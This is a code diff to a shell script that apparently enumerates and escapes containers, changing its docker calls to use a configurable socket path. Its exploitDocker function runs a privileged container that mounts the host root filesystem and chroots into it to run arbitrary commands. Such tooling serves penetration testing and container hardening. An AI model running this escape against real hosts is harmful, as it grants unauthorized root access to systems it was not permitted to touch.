@@ -674,11 +674,11 @@ enumerateContainers() {
 
   else # Not in a container
 
-    if docker ps >/dev/null 2>&1; then # Enumerate docker containers
-        dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
-        dockercontainersTotal=$(docker ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
+    if docker -H "unix://$dockerSockPath" ps >/dev/null 2>&1; then # Enumerate docker containers
+        dockercontainers=$(docker -H "unix://$dockerSockPath" ps --format "{{.Names}}" 2>/dev/null | wc -l)
+        dockercontainersTotal=$(docker -H "unix://$dockerSockPath" ps -a --format "{{.Names}}" 2>/dev/null | wc -l)
         printMsg "Docker Containers........" "$dockercontainers Running, $dockercontainersTotal Total"
-        docker ps -a
+        docker -H "unix://$dockerSockPath" ps -a
     fi
     if lxc list >/dev/null 2>&1; then # Enumerate lxc containers
         lxccontainers=$(lxc list | grep -c "| RUNNING |" 2>/dev/null)
@@ -857,7 +857,7 @@ findInterestingFiles() {
 
 checkDockerRootless() {
   printQuestion "Rootless ................"
-  if docker info 2>/dev/null|grep -q rootless; then
+  if docker -H "unix://$dockerSockPath" info 2>/dev/null|grep -q rootless; then
     printYes
     printTip "$TIP_DOCKER_ROOTLESS"
   else
@@ -869,7 +869,7 @@ getDockerVersion() {
   printQuestion "Docker Executable ......."
   if [ "$(command -v docker)" ]; then
     dockerCommand="$(command -v docker)"
-    dockerVersion="$(docker -v | cut -d',' -f1 | cut -d' ' -f3)"
+    dockerVersion="$(docker -H "unix://$dockerSockPath" -v | cut -d',' -f1 | cut -d' ' -f3)"
 
     printSuccess "$dockerCommand"
     printQuestion "Docker version .........."
@@ -1015,7 +1015,7 @@ exploitDocker() {
   printQuestion "Exploiting"
   nl
   # shellcheck disable=SC2086 # Word splitting is expected and allowed here
-  docker run -v /:/mnt --rm -it alpine chroot /mnt $cmd
+  docker -H "unix://$dockerSockPath" run -v /:/mnt --rm -it alpine chroot /mnt $cmd
 
   printQuestion "Exploit complete ...."
   if [ $? ]; then
